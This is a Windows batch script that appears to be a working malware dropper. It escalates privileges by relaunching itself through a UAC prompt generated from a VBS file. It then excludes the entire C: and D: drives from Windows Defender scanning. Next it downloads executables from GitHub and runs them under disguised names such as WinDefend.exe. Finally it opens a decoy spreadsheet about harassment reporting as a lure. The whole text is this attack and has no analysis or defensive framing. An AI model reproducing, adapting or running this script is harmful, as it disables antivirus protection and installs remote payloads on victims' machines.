:--------------------------------------
powershell -window hidden -command ""
:--------------------------------------
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
:--------------------------------------
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:--------------------------------------
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
:--------------------------------------
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:--------------------------------------
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0
:--------------------------------------
powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\'"
powershell.exe -command "Add-MpPreference -ExclusionPath 'D:\'"
:--------------------------------------
cd "C:\Users\Public"
:--------------------------------------
@echo off
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ghanimuji/ufjkdshf83374834hjad/refs/heads/main/WinDefend.exe' -OutFile WinDefend.exe"
start WinDefend.exe
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ghanimuji/ufjkdshf83374834hjad/refs/heads/main/apisetting.exe' -OutFile SystemConfig.exe"
start SystemConfig.exe
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ghanimuji/ufjkdshf83374834hjad/refs/heads/main/Veno.exe' -OutFile Important2.exe"
start Important2.exe
powershell -Command "Invoke-WebRequest 'https://github.com/brain0x01/no1/raw/refs/heads/main/SEXUAL%20hARASSMENT%20AT%20WORKPLACE%20PREVENTION%20WEEK%20REPORTING.xlsx' -OutFile REPORTING.xlsx"
start REPORTING.xlsx
